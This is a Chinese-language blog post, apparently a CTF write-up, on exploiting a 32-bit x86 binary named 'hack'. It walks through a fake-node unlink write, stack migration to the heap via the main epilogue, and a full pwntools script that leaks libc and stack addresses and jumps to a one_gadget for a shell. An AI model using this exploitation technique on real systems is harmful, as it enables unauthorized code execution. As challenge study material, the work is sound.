---
title: 'x86_stack_migration:Hack'
date: 2018-11-16 19:25:08
tags:
layout: post
---
基础太差...
tcl
<!---more-->

# Hack
不知道啥比赛的题...上课上完有个朋友给我发了题...初看挺简单...后来看了群里师傅的思路才做出来..
曲线救国曲线救国。。。
[附件][1]
# Analysis

X86的程序题目意图很明显考察利用思路...
```arm
➜  Desktop checksec hack
[*] '/home/n132/Desktop/hack'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
直接允许泄露栈地址，堆地址，libc基址
最后的部分考察利用
```arm
  P1 = fake_node->pre;
  P2 = fake_node->next;
  P1->next = P2;
  P2->pre = P1;
```
其中fake_node完全可控

# 思路
* 可以设置p1,p2然后程序就会往p1+8写p2和p2+12写p1
* 那么问题来了假设我们要控制执行流那么我们一定要有个能执行的address
* 因为可执行不可写那么显然那个address是填写在我们之前控制的堆上..
* 所以我们最后设置p1,p2的目的是让程序运行到堆上去...
* 今天的新发现...32位程序main在ret前是.（自己随便编了一个发现也是...之前都没注意到，tcltcl）
```arm
 8048702:	c9                   	leave  
 8048703:	8d 61 fc             	lea    -0x4(%ecx),%esp
 8048706:	c3                   	ret   
```
* 然后我们就可以将stack migrate到heap上跳gadget...

# 真是TCLTCL
EXP
```python
from pwn import *
#context.log_level = 'debug'
p = process("./hack")
elf = ELF("./hack")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")


p.recvuntil("input address: \n")
p.sendline("134520860")
p.recvuntil("0x")
addr = int(p.recvuntil("\n",drop=True),16)
print hex(addr)


libc_base = addr - libc.symbols['puts']

environ_addr = libc_base+libc.symbols['_environ']

p.recvuntil("Second chance: \n")
p.sendline(str(environ_addr))
p.recvuntil("0x")
stack_addr = int(p.recvuntil("\n",drop=True),16)-(0xffffdef0-4-0xfffdd000)


ret_addr = stack_addr+0xffffd05c-0x804b000
p.recvuntil("node is ")
heap=int(p.readuntil(",")[:-1],16)-0x20
log.info(hex(libc_base))
log.info(hex(stack_addr))
log.info(hex(heap))
#gdb.attach(p,'b *0x8048706')
libc.address=libc_base
payload  = p32(0x3ac69+libc_base)+p32(0)+p32(0xffffd054-12+stack_addr-0xfffdc220)+p32(heap+0x24)
p.sendafter("now: ",payload)
p.interactive("nier>>>>")
```



[1]:https://github.com/n132/Watermalon/tree/master/UNKNOW/hack